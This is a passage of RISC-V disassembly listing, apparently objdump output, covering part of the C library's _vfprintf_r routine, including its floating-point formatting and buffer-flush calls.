   11c2c:	ef9fe06f          	j	10b24 <_vfprintf_r+0x1b0>
   11c30:	8566                	mv	a0,s9
   11c32:	e41a                	sd	t1,8(sp)
   11c34:	e836                	sd	a3,16(sp)
   11c36:	cabfe0ef          	jal	ra,108e0 <strlen>
   11c3a:	00050c1b          	sext.w	s8,a0
   11c3e:	fffc4993          	not	s3,s8
   11c42:	0df14783          	lbu	a5,223(sp)
   11c46:	43f9d993          	srai	s3,s3,0x3f
   11c4a:	013c79b3          	and	s3,s8,s3
   11c4e:	ec02                	sd	zero,24(sp)
   11c50:	e882                	sd	zero,80(sp)
   11c52:	f082                	sd	zero,96(sp)
   11c54:	ec82                	sd	zero,88(sp)
   11c56:	6322                	ld	t1,8(sp)
   11c58:	2981                	sext.w	s3,s3
   11c5a:	4e81                	li	t4,0
   11c5c:	88079e63          	bnez	a5,10cf8 <_vfprintf_r+0x384>
   11c60:	ec5fe06f          	j	10b24 <_vfprintf_r+0x1b0>
   11c64:	20087793          	andi	a5,a6,512
   11c68:	26078463          	beqz	a5,11ed0 <_vfprintf_r+0x155c>
   11c6c:	0ff9f993          	andi	s3,s3,255
   11c70:	e83a                	sd	a4,16(sp)
   11c72:	4785                	li	a5,1
   11c74:	8acff06f          	j	10d20 <_vfprintf_r+0x3ac>
   11c78:	2004f793          	andi	a5,s1,512
   11c7c:	24078463          	beqz	a5,11ec4 <_vfprintf_r+0x1550>
   11c80:	67c2                	ld	a5,16(sp)
   11c82:	00078983          	lb	s3,0(a5)
   11c86:	87ce                	mv	a5,s3
   11c88:	82eff06f          	j	10cb6 <_vfprintf_r+0x342>
   11c8c:	2004f793          	andi	a5,s1,512
   11c90:	24078763          	beqz	a5,11ede <_vfprintf_r+0x156a>
   11c94:	0ff9f993          	andi	s3,s3,255
   11c98:	b375                	j	11a44 <_vfprintf_r+0x10d0>
   11c9a:	2004f793          	andi	a5,s1,512
   11c9e:	20078e63          	beqz	a5,11eba <_vfprintf_r+0x1546>
   11ca2:	0ff9f993          	andi	s3,s3,255
   11ca6:	86eff06f          	j	10d14 <_vfprintf_r+0x3a0>
   11caa:	67b2                	ld	a5,264(sp)
   11cac:	2207cd63          	bltz	a5,11ee6 <_vfprintf_r+0x1572>
   11cb0:	0df14783          	lbu	a5,223(sp)
   11cb4:	04700713          	li	a4,71
   11cb8:	0000bc97          	auipc	s9,0xb
   11cbc:	a40c8c93          	addi	s9,s9,-1472 # 1c6f8 <__clzdi2+0x178>
   11cc0:	f5b75ae3          	bge	a4,s11,11c14 <_vfprintf_r+0x12a0>
   11cc4:	0000bc97          	auipc	s9,0xb
   11cc8:	a3cc8c93          	addi	s9,s9,-1476 # 1c700 <__clzdi2+0x180>
   11ccc:	b7a1                	j	11c14 <_vfprintf_r+0x12a0>
   11cce:	0017069b          	addiw	a3,a4,1
   11cd2:	97e2                	add	a5,a5,s8
   11cd4:	01233023          	sd	s2,0(t1)
   11cd8:	01833423          	sd	s8,8(t1)
   11cdc:	f23e                	sd	a5,288(sp)
   11cde:	10d12c23          	sw	a3,280(sp)
   11ce2:	471d                	li	a4,7
   11ce4:	0341                	addi	t1,t1,16
   11ce6:	aad758e3          	bge	a4,a3,11796 <_vfprintf_r+0xe22>
   11cea:	0a10                	addi	a2,sp,272
   11cec:	85d2                	mv	a1,s4
   11cee:	8556                	mv	a0,s5
   11cf0:	242070ef          	jal	ra,18f32 <__sprint_r>
   11cf4:	820510e3          	bnez	a0,11514 <_vfprintf_r+0xba0>
   11cf8:	7792                	ld	a5,288(sp)
   11cfa:	835e                	mv	t1,s7
   11cfc:	bc69                	j	11796 <_vfprintf_r+0xe22>
   11cfe:	7702                	ld	a4,32(sp)
   11d00:	4c1d                	li	s8,7
   11d02:	9766                	add	a4,a4,s9
   11d04:	f83a                	sd	a4,48(sp)
   11d06:	7706                	ld	a4,96(sp)
   11d08:	cb49                	beqz	a4,11d9a <_vfprintf_r+0x1426>
   11d0a:	6746                	ld	a4,80(sp)
   11d0c:	eb51                	bnez	a4,11da0 <_vfprintf_r+0x142c>
   11d0e:	7726                	ld	a4,104(sp)
   11d10:	177d                	addi	a4,a4,-1
   11d12:	f4ba                	sd	a4,104(sp)
   11d14:	7706                	ld	a4,96(sp)
   11d16:	377d                	addiw	a4,a4,-1
   11d18:	f0ba                	sd	a4,96(sp)
   11d1a:	674a                	ld	a4,144(sp)
   11d1c:	66aa                	ld	a3,136(sp)
   11d1e:	0341                	addi	t1,t1,16
   11d20:	fee33823          	sd	a4,-16(t1)
   11d24:	11812703          	lw	a4,280(sp)
   11d28:	97b6                	add	a5,a5,a3
   11d2a:	fed33c23          	sd	a3,-8(t1)
   11d2e:	2705                	addiw	a4,a4,1
   11d30:	f23e                	sd	a5,288(sp)
   11d32:	0007069b          	sext.w	a3,a4
   11d36:	10e12c23          	sw	a4,280(sp)
   11d3a:	0cdc4e63          	blt	s8,a3,11e16 <_vfprintf_r+0x14a2>
   11d3e:	7726                	ld	a4,104(sp)
   11d40:	00074603          	lbu	a2,0(a4)
   11d44:	7742                	ld	a4,48(sp)
   11d46:	41b705bb          	subw	a1,a4,s11
   11d4a:	0006071b          	sext.w	a4,a2
   11d4e:	0007069b          	sext.w	a3,a4
   11d52:	00e5d463          	bge	a1,a4,11d5a <_vfprintf_r+0x13e6>
   11d56:	0005869b          	sext.w	a3,a1
   11d5a:	02d05663          	blez	a3,11d86 <_vfprintf_r+0x1412>
   11d5e:	11812703          	lw	a4,280(sp)
   11d62:	97b6                	add	a5,a5,a3
   11d64:	01b33023          	sd	s11,0(t1)
   11d68:	0017061b          	addiw	a2,a4,1
   11d6c:	00d33423          	sd	a3,8(t1)
   11d70:	f23e                	sd	a5,288(sp)
   11d72:	10c12c23          	sw	a2,280(sp)
   11d76:	0acc4a63          	blt	s8,a2,11e2a <_vfprintf_r+0x14b6>
   11d7a:	7726                	ld	a4,104(sp)
   11d7c:	0341                	addi	t1,t1,16
   11d7e:	00074603          	lbu	a2,0(a4)
   11d82:	0006071b          	sext.w	a4,a2
   11d86:	fff6c593          	not	a1,a3
   11d8a:	95fd                	srai	a1,a1,0x3f
   11d8c:	8eed                	and	a3,a3,a1
   11d8e:	9f15                	subw	a4,a4,a3
   11d90:	00e04c63          	bgtz	a4,11da8 <_vfprintf_r+0x1434>
   11d94:	9db2                	add	s11,s11,a2
   11d96:	7706                	ld	a4,96(sp)
   11d98:	fb2d                	bnez	a4,11d0a <_vfprintf_r+0x1396>
   11d9a:	6746                	ld	a4,80(sp)
   11d9c:	30070463          	beqz	a4,120a4 <_vfprintf_r+0x1730>
   11da0:	6746                	ld	a4,80(sp)
   11da2:	377d                	addiw	a4,a4,-1
   11da4:	e8ba                	sd	a4,80(sp)
   11da6:	bf95                	j	11d1a <_vfprintf_r+0x13a6>
   11da8:	11812683          	lw	a3,280(sp)
   11dac:	00ed4663          	blt	s10,a4,11db8 <_vfprintf_r+0x1444>
   11db0:	a081                	j	11df0 <_vfprintf_r+0x147c>
   11db2:	3741                	addiw	a4,a4,-16
   11db4:	02ed5e63          	bge	s10,a4,11df0 <_vfprintf_r+0x147c>
   11db8:	2685                	addiw	a3,a3,1
   11dba:	07c1                	addi	a5,a5,16
   11dbc:	01233023          	sd	s2,0(t1)
   11dc0:	01a33423          	sd	s10,8(t1)
   11dc4:	f23e                	sd	a5,288(sp)
   11dc6:	10d12c23          	sw	a3,280(sp)
   11dca:	0341                	addi	t1,t1,16
   11dcc:	fedc53e3          	bge	s8,a3,11db2 <_vfprintf_r+0x143e>
   11dd0:	0a10                	addi	a2,sp,272
   11dd2:	85d2                	mv	a1,s4
   11dd4:	8556                	mv	a0,s5
   11dd6:	e43a                	sd	a4,8(sp)
   11dd8:	15a070ef          	jal	ra,18f32 <__sprint_r>
   11ddc:	f2051c63          	bnez	a0,11514 <_vfprintf_r+0xba0>
   11de0:	6722                	ld	a4,8(sp)
   11de2:	7792                	ld	a5,288(sp)
   11de4:	11812683          	lw	a3,280(sp)
   11de8:	3741                	addiw	a4,a4,-16
   11dea:	835e                	mv	t1,s7
   11dec:	fced46e3          	blt	s10,a4,11db8 <_vfprintf_r+0x1444>
   11df0:	2685                	addiw	a3,a3,1
   11df2:	97ba                	add	a5,a5,a4
   11df4:	00e33423          	sd	a4,8(t1)
   11df8:	01233023          	sd	s2,0(t1)
   11dfc:	f23e                	sd	a5,288(sp)
   11dfe:	0006871b          	sext.w	a4,a3
   11e02:	10d12c23          	sw	a3,280(sp)
   11e06:	32ec4463          	blt	s8,a4,1212e <_vfprintf_r+0x17ba>
   11e0a:	7726                	ld	a4,104(sp)
   11e0c:	0341                	addi	t1,t1,16
   11e0e:	00074603          	lbu	a2,0(a4)
   11e12:	9db2                	add	s11,s11,a2
   11e14:	b749                	j	11d96 <_vfprintf_r+0x1422>
   11e16:	0a10                	addi	a2,sp,272
   11e18:	85d2                	mv	a1,s4
   11e1a:	8556                	mv	a0,s5
   11e1c:	116070ef          	jal	ra,18f32 <__sprint_r>
   11e20:	ee051a63          	bnez	a0,11514 <_vfprintf_r+0xba0>
   11e24:	7792                	ld	a5,288(sp)
   11e26:	835e                	mv	t1,s7
   11e28:	bf19                	j	11d3e <_vfprintf_r+0x13ca>
   11e2a:	0a10                	addi	a2,sp,272
   11e2c:	85d2                	mv	a1,s4
   11e2e:	8556                	mv	a0,s5
   11e30:	e436                	sd	a3,8(sp)
   11e32:	100070ef          	jal	ra,18f32 <__sprint_r>
   11e36:	ec051f63          	bnez	a0,11514 <_vfprintf_r+0xba0>
   11e3a:	77a6                	ld	a5,104(sp)
   11e3c:	66a2                	ld	a3,8(sp)
   11e3e:	835e                	mv	t1,s7
   11e40:	0007c603          	lbu	a2,0(a5)
   11e44:	7792                	ld	a5,288(sp)
   11e46:	0006071b          	sext.w	a4,a2
   11e4a:	bf35                	j	11d86 <_vfprintf_r+0x1412>
   11e4c:	2605                	addiw	a2,a2,1
   11e4e:	01070313          	addi	t1,a4,16
   11e52:	8c3a                	mv	s8,a4
   11e54:	f76ff06f          	j	115ca <_vfprintf_r+0xc56>
   11e58:	0a10                	addi	a2,sp,272
   11e5a:	85d2                	mv	a1,s4
   11e5c:	8556                	mv	a0,s5
   11e5e:	0d4070ef          	jal	ra,18f32 <__sprint_r>
   11e62:	ea051963          	bnez	a0,11514 <_vfprintf_r+0xba0>
   11e66:	562e                	lw	a2,232(sp)
   11e68:	7792                	ld	a5,288(sp)
   11e6a:	835e                	mv	t1,s7
   11e6c:	b329                	j	11b76 <_vfprintf_r+0x1202>
   11e6e:	0000bc97          	auipc	s9,0xb
   11e72:	882c8c93          	addi	s9,s9,-1918 # 1c6f0 <__clzdi2+0x170>
   11e76:	bb79                	j	11c14 <_vfprintf_r+0x12a0>
   11e78:	0a10                	addi	a2,sp,272
   11e7a:	85d2                	mv	a1,s4
   11e7c:	8556                	mv	a0,s5
   11e7e:	0b4070ef          	jal	ra,18f32 <__sprint_r>
   11e82:	e8051963          	bnez	a0,11514 <_vfprintf_r+0xba0>
   11e86:	7792                	ld	a5,288(sp)
   11e88:	835e                	mv	t1,s7
   11e8a:	b8e5                	j	11782 <_vfprintf_r+0xe0e>
   11e8c:	4c19                	li	s8,6
   11e8e:	b135                	j	11aba <_vfprintf_r+0x1146>
   11e90:	7682                	ld	a3,32(sp)
   11e92:	00dc8833          	add	a6,s9,a3
   11e96:	40e6873b          	subw	a4,a3,a4
   11e9a:	41b80ebb          	subw	t4,a6,s11
   11e9e:	0007069b          	sext.w	a3,a4
   11ea2:	00ded363          	bge	t4,a3,11ea8 <_vfprintf_r+0x1534>
   11ea6:	8776                	mv	a4,t4
   11ea8:	00070c9b          	sext.w	s9,a4
   11eac:	b2bd                	j	1181a <_vfprintf_r+0xea6>
   11eae:	6782                	ld	a5,0(sp)
   11eb0:	8ca2                	mv	s9,s0
   11eb2:	00f71023          	sh	a5,0(a4)
   11eb6:	d51fe06f          	j	10c06 <_vfprintf_r+0x292>
   11eba:	1982                	slli	s3,s3,0x20
   11ebc:	0209d993          	srli	s3,s3,0x20
   11ec0:	e55fe06f          	j	10d14 <_vfprintf_r+0x3a0>
   11ec4:	67c2                	ld	a5,16(sp)
   11ec6:	0007a983          	lw	s3,0(a5)
   11eca:	87ce                	mv	a5,s3
   11ecc:	debfe06f          	j	10cb6 <_vfprintf_r+0x342>
   11ed0:	1982                	slli	s3,s3,0x20
   11ed2:	0209d993          	srli	s3,s3,0x20
   11ed6:	e83a                	sd	a4,16(sp)
   11ed8:	4785                	li	a5,1
   11eda:	e47fe06f          	j	10d20 <_vfprintf_r+0x3ac>
   11ede:	1982                	slli	s3,s3,0x20
   11ee0:	0209d993          	srli	s3,s3,0x20
   11ee4:	b685                	j	11a44 <_vfprintf_r+0x10d0>
   11ee6:	02d00793          	li	a5,45
   11eea:	0cf10fa3          	sb	a5,223(sp)
   11eee:	b3d9                	j	11cb4 <_vfprintf_r+0x1340>
   11ef0:	0a10                	addi	a2,sp,272
   11ef2:	85d2                	mv	a1,s4
   11ef4:	8556                	mv	a0,s5
   11ef6:	03c070ef          	jal	ra,18f32 <__sprint_r>
   11efa:	d1dfe06f          	j	10c16 <_vfprintf_r+0x2a2>
   11efe:	03000793          	li	a5,48
   11f02:	0ef10023          	sb	a5,224(sp)
   11f06:	05800713          	li	a4,88
   11f0a:	0024e793          	ori	a5,s1,2
   11f0e:	2781                	sext.w	a5,a5
   11f10:	0ee100a3          	sb	a4,225(sp)
   11f14:	ed3e                	sd	a5,152(sp)
   11f16:	06300713          	li	a4,99
   11f1a:	ec02                	sd	zero,24(sp)
   11f1c:	12810c93          	addi	s9,sp,296
   11f20:	47d74563          	blt	a4,t4,1238a <_vfprintf_r+0x1a16>
   11f24:	69b2                	ld	s3,264(sp)
   11f26:	fdfdf713          	andi	a4,s11,-33
   11f2a:	1024e493          	ori	s1,s1,258
   11f2e:	f0ba                	sd	a4,96(sp)
   11f30:	e582                	sd	zero,200(sp)
   11f32:	6c12                	ld	s8,256(sp)
   11f34:	2481                	sext.w	s1,s1
   11f36:	1e09c463          	bltz	s3,1211e <_vfprintf_r+0x17aa>
   11f3a:	06100793          	li	a5,97
   11f3e:	52fd8c63          	beq	s11,a5,12476 <_vfprintf_r+0x1b02>
   11f42:	04100793          	li	a5,65
   11f46:	00fd8463          	beq	s11,a5,11f4e <_vfprintf_r+0x15da>
   11f4a:	eb7fe06f          	j	10e00 <_vfprintf_r+0x48c>
   11f4e:	85ce                	mv	a1,s3
   11f50:	8562                	mv	a0,s8
   11f52:	fc1a                	sd	t1,56(sp)
   11f54:	f876                	sd	t4,48(sp)
   11f56:	3f80a0ef          	jal	ra,1c34e <__trunctfdf2>
   11f5a:	11a8                	addi	a0,sp,232
   11f5c:	765040ef          	jal	ra,16ec0 <frexp>
   11f60:	32e0a0ef          	jal	ra,1c28e <__extenddftf2>
   11f64:	0000b797          	auipc	a5,0xb
   11f68:	99c78793          	addi	a5,a5,-1636 # 1c900 <zeroes.4521+0x38>
   11f6c:	6390                	ld	a2,0(a5)
   11f6e:	6794                	ld	a3,8(a5)
   11f70:	41e090ef          	jal	ra,1b38e <__multf3>
   11f74:	4601                	li	a2,0
   11f76:	4681                	li	a3,0
   11f78:	f02a                	sd	a0,32(sp)
   11f7a:	e42e                	sd	a1,8(sp)
   11f7c:	22e090ef          	jal	ra,1b1aa <__eqtf2>
   11f80:	62a2                	ld	t0,8(sp)
   11f82:	7702                	ld	a4,32(sp)
   11f84:	7ec2                	ld	t4,48(sp)
   11f86:	7362                	ld	t1,56(sp)
   11f88:	e119                	bnez	a0,11f8e <_vfprintf_r+0x161a>
   11f8a:	4785                	li	a5,1
   11f8c:	d5be                	sw	a5,232(sp)
   11f8e:	0000a797          	auipc	a5,0xa
   11f92:	77a78793          	addi	a5,a5,1914 # 1c708 <__clzdi2+0x188>
   11f96:	e8be                	sd	a5,80(sp)
   11f98:	020e9793          	slli	a5,t4,0x20
   11f9c:	0000b697          	auipc	a3,0xb
   11fa0:	94468693          	addi	a3,a3,-1724 # 1c8e0 <zeroes.4521+0x18>
   11fa4:	9381                	srli	a5,a5,0x20
   11fa6:	6290                	ld	a2,0(a3)
   11fa8:	0785                	addi	a5,a5,1
   11faa:	6694                	ld	a3,8(a3)
   11fac:	97e6                	add	a5,a5,s9
   11fae:	f13e                	sd	a5,160(sp)
   11fb0:	01dc87bb          	addw	a5,s9,t4
   11fb4:	fd32                	sd	a2,184(sp)
   11fb6:	e1b6                	sd	a3,192(sp)
   11fb8:	8c66                	mv	s8,s9
   11fba:	db3e                	sw	a5,180(sp)
   11fbc:	a831                	j	11fd8 <_vfprintf_r+0x1664>
   11fbe:	4601                	li	a2,0
   11fc0:	4681                	li	a3,0
   11fc2:	e4ae                	sd	a1,72(sp)
   11fc4:	e0aa                	sd	a0,64(sp)
   11fc6:	1e4090ef          	jal	ra,1b1aa <__eqtf2>
   11fca:	7ec2                	ld	t4,48(sp)
   11fcc:	7362                	ld	t1,56(sp)
   11fce:	6f86                	ld	t6,64(sp)
   11fd0:	68a6                	ld	a7,72(sp)
   11fd2:	62a2                	ld	t0,8(sp)
   11fd4:	7702                	ld	a4,32(sp)
   11fd6:	c135                	beqz	a0,1203a <_vfprintf_r+0x16c6>
   11fd8:	766a                	ld	a2,184(sp)
   11fda:	668e                	ld	a3,192(sp)
   11fdc:	853a                	mv	a0,a4
   11fde:	8596                	mv	a1,t0
   11fe0:	fc1a                	sd	t1,56(sp)
   11fe2:	f876                	sd	t4,48(sp)
   11fe4:	3aa090ef          	jal	ra,1b38e <__multf3>
   11fe8:	e42e                	sd	a1,8(sp)
   11fea:	f02a                	sd	a0,32(sp)
   11fec:	1b00a0ef          	jal	ra,1c19c <__fixtfsi>
   11ff0:	0005099b          	sext.w	s3,a0
   11ff4:	854e                	mv	a0,s3
   11ff6:	23c0a0ef          	jal	ra,1c232 <__floatsitf>
   11ffa:	7882                	ld	a7,32(sp)
   11ffc:	6722                	ld	a4,8(sp)
   11ffe:	862a                	mv	a2,a0
   12000:	86ae                	mv	a3,a1
   12002:	8546                	mv	a0,a7
   12004:	85ba                	mv	a1,a4
   12006:	19b090ef          	jal	ra,1b9a0 <__subtf3>
   1200a:	67c6                	ld	a5,80(sp)
   1200c:	f562                	sd	s8,168(sp)
   1200e:	0c05                	addi	s8,s8,1
   12010:	01378733          	add	a4,a5,s3
   12014:	57da                	lw	a5,180(sp)
   12016:	00074703          	lbu	a4,0(a4)
   1201a:	f02a                	sd	a0,32(sp)
   1201c:	418787bb          	subw	a5,a5,s8
   12020:	ecbe                	sd	a5,88(sp)
   12022:	778a                	ld	a5,160(sp)
   12024:	feec0fa3          	sb	a4,-1(s8)
   12028:	e42e                	sd	a1,8(sp)
   1202a:	7ec2                	ld	t4,48(sp)
   1202c:	7362                	ld	t1,56(sp)
   1202e:	8faa                	mv	t6,a0
   12030:	88ae                	mv	a7,a1
   12032:	f98796e3          	bne	a5,s8,11fbe <_vfprintf_r+0x164a>
   12036:	57fd                	li	a5,-1
   12038:	ecbe                	sd	a5,88(sp)
   1203a:	0000b717          	auipc	a4,0xb
   1203e:	8b670713          	addi	a4,a4,-1866 # 1c8f0 <zeroes.4521+0x28>
   12042:	6310                	ld	a2,0(a4)
   12044:	6714                	ld	a3,8(a4)
   12046:	857e                	mv	a0,t6
   12048:	85c6                	mv	a1,a7
   1204a:	f01a                	sd	t1,32(sp)
   1204c:	e476                	sd	t4,8(sp)
   1204e:	e4fe                	sd	t6,72(sp)
   12050:	e0b2                	sd	a2,64(sp)
   12052:	fc36                	sd	a3,56(sp)
   12054:	f846                	sd	a7,48(sp)
   12056:	1e8090ef          	jal	ra,1b23e <__getf2>
   1205a:	6ea2                	ld	t4,8(sp)
   1205c:	7302                	ld	t1,32(sp)
   1205e:	2ca04f63          	bgtz	a0,1233c <_vfprintf_r+0x19c8>
   12062:	6fa6                	ld	t6,72(sp)
   12064:	78c2                	ld	a7,48(sp)
   12066:	6606                	ld	a2,64(sp)
   12068:	76e2                	ld	a3,56(sp)
   1206a:	857e                	mv	a0,t6
   1206c:	85c6                	mv	a1,a7
   1206e:	13c090ef          	jal	ra,1b1aa <__eqtf2>
   12072:	6ea2                	ld	t4,8(sp)
   12074:	7302                	ld	t1,32(sp)
   12076:	e509                	bnez	a0,12080 <_vfprintf_r+0x170c>
   12078:	0019f993          	andi	s3,s3,1
   1207c:	2c099063          	bnez	s3,1233c <_vfprintf_r+0x19c8>
   12080:	67e6                	ld	a5,88(sp)
   12082:	03000693          	li	a3,48
   12086:	00178713          	addi	a4,a5,1
   1208a:	9762                	add	a4,a4,s8
   1208c:	0007c763          	bltz	a5,1209a <_vfprintf_r+0x1726>
   12090:	0c05                	addi	s8,s8,1
   12092:	fedc0fa3          	sb	a3,-1(s8)
   12096:	ff871de3          	bne	a4,s8,12090 <_vfprintf_r+0x171c>
   1209a:	419c07bb          	subw	a5,s8,s9
   1209e:	f03e                	sd	a5,32(sp)
   120a0:	de5fe06f          	j	10e84 <_vfprintf_r+0x510>
   120a4:	7702                	ld	a4,32(sp)
   120a6:	9766                	add	a4,a4,s9
   120a8:	efb77e63          	bgeu	a4,s11,117a4 <_vfprintf_r+0xe30>
   120ac:	8dba                	mv	s11,a4
   120ae:	ef6ff06f          	j	117a4 <_vfprintf_r+0xe30>
   120b2:	6766                	ld	a4,88(sp)
   120b4:	57f5                	li	a5,-3
   120b6:	00f74463          	blt	a4,a5,120be <_vfprintf_r+0x174a>
   120ba:	00eed863          	bge	t4,a4,120ca <_vfprintf_r+0x1756>
   120be:	3df9                	addiw	s11,s11,-2
   120c0:	fdfdf793          	andi	a5,s11,-33
   120c4:	f0be                	sd	a5,96(sp)
   120c6:	ddffe06f          	j	10ea4 <_vfprintf_r+0x530>
   120ca:	7782                	ld	a5,32(sp)
   120cc:	6766                	ld	a4,88(sp)
   120ce:	16f74563          	blt	a4,a5,12238 <_vfprintf_r+0x18c4>
   120d2:	67ea                	ld	a5,152(sp)
   120d4:	8c3a                	mv	s8,a4
   120d6:	8b85                	andi	a5,a5,1
   120d8:	c781                	beqz	a5,120e0 <_vfprintf_r+0x176c>
   120da:	77c6                	ld	a5,112(sp)
   120dc:	00e78c3b          	addw	s8,a5,a4
   120e0:	67ea                	ld	a5,152(sp)
   120e2:	4007f793          	andi	a5,a5,1024
   120e6:	c781                	beqz	a5,120ee <_vfprintf_r+0x177a>
   120e8:	67e6                	ld	a5,88(sp)
   120ea:	30f04763          	bgtz	a5,123f8 <_vfprintf_r+0x1a84>
   120ee:	fffc4993          	not	s3,s8
   120f2:	43f9d993          	srai	s3,s3,0x3f
   120f6:	013c79b3          	and	s3,s8,s3
   120fa:	2981                	sext.w	s3,s3
   120fc:	06700d93          	li	s11,103
   12100:	e882                	sd	zero,80(sp)
   12102:	f082                	sd	zero,96(sp)
   12104:	e83fe06f          	j	10f86 <_vfprintf_r+0x612>
   12108:	0df14783          	lbu	a5,223(sp)
   1210c:	4e81                	li	t4,0
   1210e:	c399                	beqz	a5,12114 <_vfprintf_r+0x17a0>
   12110:	be9fe06f          	j	10cf8 <_vfprintf_r+0x384>
   12114:	a11fe06f          	j	10b24 <_vfprintf_r+0x1b0>
   12118:	ed26                	sd	s1,152(sp)
   1211a:	ec02                	sd	zero,24(sp)
   1211c:	84fe                	mv	s1,t6
   1211e:	57fd                	li	a5,-1
   12120:	17fe                	slli	a5,a5,0x3f
   12122:	00f9c9b3          	xor	s3,s3,a5
   12126:	02d00793          	li	a5,45
   1212a:	e5be                	sd	a5,200(sp)
   1212c:	b539                	j	11f3a <_vfprintf_r+0x15c6>
   1212e:	0a10                	addi	a2,sp,272
   12130:	85d2                	mv	a1,s4
   12132:	8556                	mv	a0,s5
   12134:	5ff060ef          	jal	ra,18f32 <__sprint_r>
   12138:	bc051e63          	bnez	a0,11514 <_vfprintf_r+0xba0>
   1213c:	77a6                	ld	a5,104(sp)
   1213e:	835e                	mv	t1,s7
   12140:	0007c603          	lbu	a2,0(a5)
   12144:	7792                	ld	a5,288(sp)
   12146:	9db2                	add	s11,s11,a2
   12148:	b1b9                	j	11d96 <_vfprintf_r+0x1422>
   1214a:	02d00793          	li	a5,45
   1214e:	0cf10fa3          	sb	a5,223(sp)
   12152:	bc4d                	j	11c04 <_vfprintf_r+0x1290>
   12154:	8776                	mv	a4,t4
   12156:	11bc                	addi	a5,sp,232
   12158:	0f810893          	addi	a7,sp,248
   1215c:	0ec10813          	addi	a6,sp,236
   12160:	4689                	li	a3,2
   12162:	85e2                	mv	a1,s8
   12164:	864e                	mv	a2,s3
   12166:	8556                	mv	a0,s5
   12168:	f01a                	sd	t1,32(sp)
   1216a:	e476                	sd	t4,8(sp)
   1216c:	458020ef          	jal	ra,145c4 <_ldtoa_r>
   12170:	7706                	ld	a4,96(sp)
   12172:	04700793          	li	a5,71
   12176:	6ea2                	ld	t4,8(sp)
   12178:	7302                	ld	t1,32(sp)
   1217a:	8caa                	mv	s9,a0
   1217c:	02f71d63          	bne	a4,a5,121b6 <_vfprintf_r+0x1842>
   12180:	67ea                	ld	a5,152(sp)
   12182:	8b85                	andi	a5,a5,1
   12184:	18079b63          	bnez	a5,1231a <_vfprintf_r+0x19a6>
   12188:	04700713          	li	a4,71
   1218c:	77ee                	ld	a5,248(sp)
   1218e:	f0ba                	sd	a4,96(sp)
   12190:	ceffe06f          	j	10e7e <_vfprintf_r+0x50a>
   12194:	8776                	mv	a4,t4
   12196:	0f810893          	addi	a7,sp,248
   1219a:	0ec10813          	addi	a6,sp,236
   1219e:	11bc                	addi	a5,sp,232
   121a0:	468d                	li	a3,3
   121a2:	85e2                	mv	a1,s8
   121a4:	864e                	mv	a2,s3
   121a6:	8556                	mv	a0,s5
   121a8:	f01a                	sd	t1,32(sp)
   121aa:	e476                	sd	t4,8(sp)
   121ac:	418020ef          	jal	ra,145c4 <_ldtoa_r>
   121b0:	6ea2                	ld	t4,8(sp)
   121b2:	7302                	ld	t1,32(sp)
   121b4:	8caa                	mv	s9,a0
   121b6:	7706                	ld	a4,96(sp)
   121b8:	04600793          	li	a5,70
   121bc:	01dc88b3          	add	a7,s9,t4
   121c0:	00f70463          	beq	a4,a5,121c8 <_vfprintf_r+0x1854>
   121c4:	c85fe06f          	j	10e48 <_vfprintf_r+0x4d4>
   121c8:	000cc703          	lbu	a4,0(s9)
   121cc:	03000793          	li	a5,48
   121d0:	00f70663          	beq	a4,a5,121dc <_vfprintf_r+0x1868>
   121d4:	572e                	lw	a4,232(sp)
   121d6:	98ba                	add	a7,a7,a4
   121d8:	c71fe06f          	j	10e48 <_vfprintf_r+0x4d4>
   121dc:	4601                	li	a2,0
   121de:	4681                	li	a3,0
   121e0:	8562                	mv	a0,s8
   121e2:	85ce                	mv	a1,s3
   121e4:	f846                	sd	a7,48(sp)
   121e6:	f01a                	sd	t1,32(sp)
   121e8:	e476                	sd	t4,8(sp)
   121ea:	7c1080ef          	jal	ra,1b1aa <__eqtf2>
   121ee:	6ea2                	ld	t4,8(sp)
   121f0:	7302                	ld	t1,32(sp)
   121f2:	78c2                	ld	a7,48(sp)
   121f4:	d165                	beqz	a0,121d4 <_vfprintf_r+0x1860>
   121f6:	4785                	li	a5,1
   121f8:	41d7873b          	subw	a4,a5,t4
   121fc:	d5ba                	sw	a4,232(sp)
   121fe:	98ba                	add	a7,a7,a4
   12200:	c49fe06f          	j	10e48 <_vfprintf_r+0x4d4>
   12204:	0a10                	addi	a2,sp,272
   12206:	85d2                	mv	a1,s4
   12208:	8556                	mv	a0,s5
   1220a:	529060ef          	jal	ra,18f32 <__sprint_r>
   1220e:	b0051363          	bnez	a0,11514 <_vfprintf_r+0xba0>
   12212:	572e                	lw	a4,232(sp)
   12214:	7792                	ld	a5,288(sp)
   12216:	835e                	mv	t1,s7
   12218:	dc2ff06f          	j	117da <_vfprintf_r+0xe66>
   1221c:	0df14783          	lbu	a5,223(sp)
   12220:	e836                	sd	a3,16(sp)
   12222:	e882                	sd	zero,80(sp)
   12224:	f082                	sd	zero,96(sp)
   12226:	ec82                	sd	zero,88(sp)
   12228:	89f6                	mv	s3,t4
   1222a:	8c76                	mv	s8,t4
   1222c:	4e81                	li	t4,0
   1222e:	c399                	beqz	a5,12234 <_vfprintf_r+0x18c0>
   12230:	ac9fe06f          	j	10cf8 <_vfprintf_r+0x384>
   12234:	8f1fe06f          	j	10b24 <_vfprintf_r+0x1b0>
   12238:	7702                	ld	a4,32(sp)
   1223a:	77c6                	ld	a5,112(sp)
   1223c:	06700d93          	li	s11,103
   12240:	00e78c3b          	addw	s8,a5,a4
   12244:	6766                	ld	a4,88(sp)
   12246:	2ce05263          	blez	a4,1250a <_vfprintf_r+0x1b96>
   1224a:	67ea                	ld	a5,152(sp)
   1224c:	4007f793          	andi	a5,a5,1024
   12250:	1a079663          	bnez	a5,123fc <_vfprintf_r+0x1a88>
   12254:	fffc4993          	not	s3,s8
   12258:	43f9d993          	srai	s3,s3,0x3f
   1225c:	013c79b3          	and	s3,s8,s3
   12260:	2981                	sext.w	s3,s3
   12262:	bd79                	j	12100 <_vfprintf_r+0x178c>
   12264:	67ea                	ld	a5,152(sp)
   12266:	6766                	ld	a4,88(sp)
   12268:	8b85                	andi	a5,a5,1
   1226a:	00fee7b3          	or	a5,t4,a5
   1226e:	2ae05c63          	blez	a4,12526 <_vfprintf_r+0x1bb2>
   12272:	26079d63          	bnez	a5,124ec <_vfprintf_r+0x1b78>
   12276:	6c66                	ld	s8,88(sp)
   12278:	06600d93          	li	s11,102
   1227c:	b7f9                	j	1224a <_vfprintf_r+0x18d6>
   1227e:	0a10                	addi	a2,sp,272
   12280:	85d2                	mv	a1,s4
   12282:	8556                	mv	a0,s5
   12284:	4af060ef          	jal	ra,18f32 <__sprint_r>
